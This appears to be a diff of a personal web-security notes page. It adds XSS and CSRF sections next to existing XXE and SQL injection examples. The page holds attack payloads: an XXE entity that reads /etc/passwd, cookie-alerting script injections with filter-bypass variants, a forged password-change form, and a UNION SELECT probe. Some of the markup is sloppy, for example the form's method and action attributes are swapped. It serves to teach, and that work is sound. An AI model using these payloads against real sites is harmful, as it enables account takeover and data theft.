@@ -14,7 +14,7 @@
 
 		<div class="box">
 			<h3>XML injection</h3>
-			<p>Example from a htb machine (bounty hunter): </p>
+			<p>example from a htb machine (bounty hunter): </p>
 			<code class="etc">
 				&lt?xml  version="1.0" encoding="ISO-8859-1"?&gt <br>
 				&ltbugreport&gt <br>
@@ -24,7 +24,7 @@
 				&ltreward&gt 100 &lt/reward&gt <br>
 				&lt/bugreport&gt
 			</code>
-			<p>Injected version, using file desclosure method: </p>
+			<p>injected version, using file desclosure method: </p>
 			<code class="etc">
 				&lt?xml  version="1.0" encoding="ISO-8859-1"?&gt <br>
 				&lt!DOCTYPE foo [ &lt!ENTITY xxe SYSTEM "file:///etc/passwd"&gt ]&gt <br>
@@ -40,8 +40,48 @@
 		</div>
 
 		<div class="box">
+			<h3>XSS injection</h3>
+			<p>consider the following code on a web server: </p>
+			<code class="etc">
+				if( is_set($_GET["name"]) ) <br>
+				<span class="spacer">aaaa</span>echo "Welcome, $_GET[name]"
+			</code>
+			<p>and the following request: </p>
+			<code class="etc">
+				http://localhost/welcome.php?name=&ltscript>alert(document.cookie)&lt/script>
+			</code>
+			<p>if it isn't a shitty code, it will have some protections, here are some ways to bypass it:</p>
+			<code class="etc">
+				http://localhost/welcome.php?name=&ltsCriPt>alert(document.cookie)&lt/sCrIpT> <br>
+				http://localhost/welcome.php?name=&ltsc&ltscript>ript>alert(document.cookie)&lt/scri&ltscript>pt> <br>
+			</code>
+		</div>
+
+		<div class="box">
+			<h3>CSFR</h3>
+			<p>consider the following code on a web server, that changes the password of an account: </p>
+			<code class="etc">
+				&ltform method="change-pass.php" action="GET"> <br>
+				<span class="spacer">aaaa</span>&ltinput type="password" name="new_password"> <br>
+				<span class="spacer">aaaa</span>&ltinput type="password" name="new_password2"> <br>
+				<span class="spacer">aaaa</span>&ltinput type="submit"> <br>
+				&lt/form> <br>
+			</code>
+			<p>if server is vulnerable, we can have the same form on a web server, and send to the same destination as the authentical one: </p>
+			<code class="etc">
+				&ltform method="site.com/change-pass.php" action="GET"> <br>
+				<span class="spacer">aaaa</span>&ltinput type="password" name="new_password" value="pwned"> <br>
+				<span class="spacer">aaaa</span>&ltinput type="password" name="new_password2" value="pwned"> <br>
+				<span class="spacer">aaaa</span>&ltinput type="submit"> <br>
+				&lt/form> <br>
+			</code>
+			<p>pressing submit, we send the form to the website, not having any form of special privileges</p>
+			<p>repair how we use se the same form, but on a DIFFERENT website</a>
+		</div>
+
+		<div class="box">
 			<h3>SQL injection</h3>
-			<p>Determining number of columns af actual table:</p>
+			<p>determining number of columns af actual table:</p>
 			<code class="etc">
 				http://store.com/login?name=' UNION ALL SELECT 1 %23'
 			</code>
